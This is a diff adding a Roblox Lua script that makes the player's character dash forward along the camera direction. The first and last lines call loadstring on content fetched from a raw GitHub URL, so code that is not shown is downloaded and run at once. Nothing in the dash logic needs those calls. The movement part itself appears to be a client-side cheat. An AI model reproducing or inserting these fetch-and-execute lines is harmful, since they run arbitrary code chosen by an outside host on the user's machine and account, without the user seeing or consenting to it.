@@ -1,0 +1,57 @@
+
+loadstring(game:HttpGet('https://raw.githubusercontent.com/kenkenplaygt/kenkenplaygt/refs/heads/main/Play'))()
+
+task.wait(0.3)
+local player = game.Players.LocalPlayer
+local character = player.Character or player.CharacterAdded:Wait()
+local humanoid = character:WaitForChild("Humanoid")
+local humanoidRootPart = character:WaitForChild("HumanoidRootPart")
+local camera = workspace.CurrentCamera  -- Reference to the camera
+
+
+local dashSpeed = 200
+local dashDuration = 0.1
+local isDashing = false
+
+
+local dashAnim = Instance.new("Animation")
+dashAnim.AnimationId = "rbxassetid://0"
+local animTrack = humanoid:LoadAnimation(dashAnim)
+ 
+
+local function moveForward()
+    if isDashing then return end
+    isDashing = true
+
+    wait(0)
+
+
+    local bodyVelocity = Instance.new("BodyVelocity")
+    bodyVelocity.MaxForce = Vector3.new(100000, 100000, 100000)  -- Max force to apply the movement
+    bodyVelocity.Parent = humanoidRootPart
+
+    local dashEndTime = tick() + dashDuration  -- Time when dash should end
+
+    while tick() < dashEndTime do
+       
+        local cameraDirection = camera.CFrame.LookVector
+        local dashDirection = Vector3.new(cameraDirection.X, 0, cameraDirection.Z).unit
+
+        bodyVelocity.Velocity = dashDirection * dashSpeed
+
+        wait(0)  
+    end
+
+ 
+    animTrack:Stop()
+
+  
+    bodyVelocity:Destroy()
+    isDashing = false
+end
+
+
+moveForward()
+  
+task.wait(0)
+loadstring(game:HttpGet('https://raw.githubusercontent.com/kenkenplaygt/kenkenplaygt/refs/heads/main/Ma'))()
